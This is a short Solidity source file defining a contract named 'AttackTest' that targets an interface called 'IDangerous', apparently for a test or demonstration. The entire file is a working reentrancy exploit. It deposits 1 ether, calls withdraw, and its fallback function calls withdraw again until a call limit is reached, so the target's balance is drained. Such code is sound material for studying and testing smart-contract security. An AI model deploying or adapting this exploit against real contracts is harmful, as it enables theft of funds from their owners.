
pragma solidity ^0.4.24;

contract IDangerous {
    function depositMoney() public payable;
    function withdraw(uint amount) public;
}

contract AttackTest {
    IDangerous public target;
    uint public count;
    uint public maxCalls = 3;
    uint public withdrawalAmount = 1 ether;

    constructor(address _target) public {
        target = IDangerous(_target);
    }

    function deposit() public payable {
        require(msg.value == withdrawalAmount);
        target.depositMoney.value(msg.value)();
    }

    function attack() public {
        require(count == 0);
        target.withdraw(withdrawalAmount);
    }

    function() external payable {
        count += 1;

        if (count < maxCalls) {
            target.withdraw(withdrawalAmount);
        }
    }
}
